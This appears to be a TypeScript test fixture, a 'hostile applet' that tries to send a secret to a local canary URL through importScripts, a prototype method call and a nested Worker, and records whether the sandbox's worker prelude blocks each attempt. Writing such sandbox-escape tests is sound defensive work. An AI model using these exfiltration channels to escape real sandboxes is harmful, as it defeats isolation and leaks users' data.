// Hostile applet: attempt to exfiltrate via importScripts (a classic-worker
// network channel whose URL would otherwise reach the host's own logs). Tries the
// own-property, the prototype method, and a nested Worker. The worker prelude
// neutralizes all three, so none of these can issue a request to the canary.
import React from 'react';
import {runApplet} from '../../../src/applet/runtime';
import {Text} from '../../../src/applet/remote-elements';

const CANARY = 'http://localhost:4399/import-scripts?d=SECRET';
const attempts: string[] = [];

function tryIt(label: string, fn: () => void) {
  try {
    fn();
    attempts.push(`${label}: NOT BLOCKED`);
  } catch (error) {
    attempts.push(`${label}: blocked (${(error as Error).message})`);
  }
}

tryIt('self.importScripts', () => (self as unknown as {importScripts(u: string): void}).importScripts(CANARY));
tryIt('proto.importScripts', () => {
  const proto = Object.getPrototypeOf(self) as {importScripts(u: string): void};
  proto.importScripts.call(self, CANARY);
});
tryIt('nested Worker', () => {
  // a nested worker could fetch the canary as its script URL
  new (self as unknown as {Worker: new (u: string) => unknown}).Worker(CANARY);
});

function App() {
  return React.createElement(Text, null, attempts.join(' | '));
}
runApplet(App as unknown as React.ComponentType<never>, {
  appletId: 'hostile.import-scripts',
  appletVersion: '0',
});
